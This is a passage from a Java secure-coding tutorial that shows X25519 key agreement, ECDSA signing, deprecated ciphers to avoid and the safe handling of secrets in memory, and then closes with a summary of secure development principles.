        cipher.init(forEncryption, parameters);

        return doFinal(input, cipher);
    }

    private byte[] doFinal(byte[] input, GCMBlockCipher cipher) {
        byte[] output = new byte[cipher.getOutputSize(input.length)];
        int len = cipher.processBytes(input, 0, input.length, output, 0);

        try {
            cipher.doFinal(output, len);
        } catch (InvalidCipherTextException e) {
            throw new IllegalStateException("Cipher operation failed", e);
        }

        return output;
    }
}
```

In practice, symmetric algorithms are more efficient and faster than asymmetric algorithms, so asymmetric algorithms are often used to **exchange** symmetric keys or **establishing** a shared symmetric key. This is where cryptography based on **elliptic curves** comes into play:

### Elliptic Curve Cryptography (ECC)

One of the main uses of ECC is Elliptic Curve Diffie-Hellman (ECDH), which allows two parties to securely agree on a common symmetric key thanks to the mathematical properties of curves. This key is then used to encrypt the data using the faster and more efficient symmetric algorithm we described above. One of the most popular curves for this task is **Curve25519** (also known as _X25519_):

The concept is simple. Each side generates its own key pair: a private key and a public key. The private key remains secret and the public key is passed to the other party. Each party then uses its private key and the opposite party's public key to compute a shared secret.

The computed shared secrets will be the same for both parties, but for an attacker who does not possess the private key of either party, the secret will remain unknown. Elliptic curve key exchange is based on a mathematical operation called **scalar multiplication**: the client multiplies the server's public key by own private key, and the server multiplies the client's public key by own private key. Due to the peculiarities of curve math, the result of the multiplication will be the same. This is the **shared secret**.

In fact, we meet this algorithm every day, the same principle is used to exchange keys between client and server when establishing **TLS** connection.

The implementation of ECDH in Java is very simple, using Bouncy Castle. In the example, we will just generate keys for both parties (the client and server in practice do not know each other's private keys), and calculate the Shared Secret:

```java
public class ECDHKeyAgreementExample {
    private static final SecureRandom SECURE_RANDOM;

    static {
        try {
            SECURE_RANDOM = SecureRandom.getInstanceStrong();
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    public static void main(String[] args) throws Exception {
        X25519PrivateKeyParameters clientPrivateKey = new X25519PrivateKeyParameters(SECURE_RANDOM);
        X25519PrivateKeyParameters serverPrivateKey = new X25519PrivateKeyParameters(SECURE_RANDOM);

        X25519PublicKeyParameters clientPublicKey = clientPrivateKey.generatePublicKey();
        X25519PublicKeyParameters serverPublicKey = serverPrivateKey.generatePublicKey();

        // Both of them are same
        byte[] clientSharedSecret = agreeSharedSecret(clientPrivateKey, serverPublicKey);
        byte[] serverSharedSecret = agreeSharedSecret(serverPrivateKey, clientPublicKey);
    }

    private static byte[] agreeSharedSecret(X25519PrivateKeyParameters privateKey, X25519PublicKeyParameters publicKey) {
        X25519Agreement agreement = new X25519Agreement();
        agreement.init(privateKey);

        byte[] sharedSecret = new byte[32]; // length of key
        agreement.calculateAgreement(publicKey, sharedSecret, 0);
        return sharedSecret;
    }
}
```

When we talk about elliptic curves, we have a private and public key pair, right? So we can use the private key to **sign** the data, and use the public key to verify its integrity. So we can create signatures using **ECDSA (Elliptic Curve Digital Signature Algorithm**:

```java
public class ECDSAExample {
    private static final SecureRandom SECURE_RANDOM;

    static {
        try {
            SECURE_RANDOM = SecureRandom.getInstanceStrong();
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    public static void main(String[] args) throws Exception {
        KeyPair keyPair = generateECKeyPair();

        String data = "Hello, this is a message to be signed.";
        byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);

        byte[] signature = signData(dataBytes, keyPair.getPrivate());

        System.out.println("Signature: " + Base64.getEncoder().encodeToString(signature));

        boolean isVerified = verifySignature(dataBytes, signature, keyPair.getPublic());

        System.out.println("Verify signature result: " + isVerified);
    }

    private static KeyPair generateECKeyPair() throws Exception {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("EC");
        keyPairGenerator.initialize(new ECGenParameterSpec("secp256r1"), SECURE_RANDOM);
        return keyPairGenerator.generateKeyPair();
    }

    private static byte[] signData(byte[] data, PrivateKey privateKey) throws Exception {
        Signature signature = Signature.getInstance("SHA256withECDSA");
        signature.initSign(privateKey);
        signature.update(data);

        return signature.sign();
    }

    private static boolean verifySignature(byte[] data, byte[] signature, PublicKey publicKey) throws Exception {
        Signature signatureInstance = Signature.getInstance("SHA256withECDSA");
        signatureInstance.initVerify(publicKey);
        signatureInstance.update(data);

        return signatureInstance.verify(signature);
    }
}
```

### Avoid deprecated and insecure encryption algorithhms

- **DES** - Uses a 56-bit key. This means that for bruteforcing it, you only need to try 2^56 combinations, which in today's reality, would take hours (or even a few minutes).
- **Triple DES** is an attempt to fix the **DES** short key, where the key size is 158 bits. But because of **meet-in-the-middle** attacks, the effective key length is only 112 bits. Resulting key sizes are still smaller than current standards (minimum 128 bits, preferably 256 bits), and with more to add, because of its triple encryption, it's just plain slow.
- **RC4** - This algorithm was used for streaming data encryption. Because of the predictable properties of the first bytes, it allowed you to anticipate part of the key stream.
- **RSA** - Asymmetric encryption algorithm. With modern factorization techniques and computing power, keys smaller than **2048 bits** can be cracked (larger keys are only a matter of time). And if a PKCS#1 encryption scheme is used, regardless of key length, there is a high risk for **Padding Oracle** attacks.

### Store sensitive data in memory securely

In the examples where we worked with sensitive information (like passwords), we needed to ensure that we used them correctly in memory.

Let's agree in advance, if you work with passwords, treat them not as `String` strings, but as a `char[]` or  `byte[]` arrays. This is primarily to **clear** our array when we no longer need it, thus protecting us from **Data in Use** attacks. It is implemented in a simple manner:

```java
public static void destroy(char[] chars) {
    Arrays.fill(chars, '\0');
}

public static void destroy(byte[] bytes) {
    Arrays.fill(bytes, (byte) 0);
}
```

There is also one important thing to consider. All this data is stored in RAM (**RAM**), right? When memory is not enough, data that is rarely used can **swap**'d to disk. Here it is important, in case sensitive data is stored in memory for a long time (let's say we cached it), it should **never be swapped to disk**. This can lead to a big internal threat if an attacker gets into the server, because disk is much easier to analyze than memory, and even if the data has already been deleted from it, if that memory segment has not been overwritten, it can be recovered.

On UNIX systems, it is realized through memory allocation and `mlock` settings on them, and from Java, to allocate non-swappable memory, followed by its obfuscation can [OWASP Netryx Memory](https://github.com/OWASP/www-project-netryx) be used:

```java
byte[] data = "sensitive data".getBytes();

SecureMemory memory = new SecureMemory(data.length);
memory.write(data);

// After we wrote data, we can freely clear it
Arrays.fill(data, (byte) 0);

memory.obfuscate();

// Note, `bytes` would be auto destroyed after it leaves lambda.
// You can create a copy of bytes, if needed.
char[] originalSensitive = memory.deobfuscate(bytes -> Bytes.wrap(bytes).toCharArray());

memory.close(); // clears memory when we don't need it anymore
```

This method is particularly useful for systems with **high security requirements**.

## Conclusion

Following the principles of secure programming is the basis for building a secure application. Security must be integrated at all levels of development, from architecture design to the actual writing of code. No matter how secure the environment on which the application runs, if the application itself is vulnerable, it creates a big threat for the entire system. Conversely, even if the code is secure, a weak architecture or poor infrastructure management can lead to critical vulnerabilities. That's why we discussed creating a strong and secure architecture in [Secure & Resilient Design](https://).

Input validation is a key aspect of security. At first glance, this practice may seem simple, but ignoring it can lead to devastating consequences such as injection attacks, XSS and other types of threats. Proper data validation is not only a defense against obvious vulnerabilities, but it is also the first line of defense that helps protect your system from potentially unknown attacks based on malicious user inputs.

Broken Access Control is a top 1 vulnerability, so it's critical to understand access control methods and implement them correctly in your system. And by following the principle of “Secure out of the box” you protect yourself from a potentially fatal error. Moreover, it is not enough just to authenticate & authorize the user, you must also secure the target user as much as possible.

Error states are inevitable in any software, but it is important that they are handled in a way that does not expose potentially damaging information to malicious users, this is a violation of the first principle of the CIA - Confidentiality. Again, gathering information about the target is the very first step in an penetration attempt.

Finally, when dealing with sensitive data, we need to make sure that we only use trusted and up-to-date cryptographic methods to protect it, and that our secrets are handled as securely as possible. That's it!
